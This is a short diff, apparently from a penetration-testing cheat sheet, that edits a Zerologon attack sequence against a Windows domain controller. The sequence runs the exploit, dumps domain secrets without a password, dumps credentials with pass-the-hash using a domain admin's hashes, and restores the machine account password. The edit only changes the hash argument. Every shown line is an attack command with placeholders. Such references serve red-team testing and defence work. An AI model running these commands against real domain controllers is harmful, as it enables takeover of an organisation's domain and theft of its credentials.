@@ -68,7 +68,7 @@ zerologon-exploit 'DC_name' 'DC_IP_address'
 secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'
 
 # Obtain the machine account hex encoded password with the domain admin credentials
-secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'
+secretsdump -hashes 'LMhash':'NThash' 'Domain'/'Domain_admin'@'Domain_controller'
 
 # Restore the machine account password
 zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
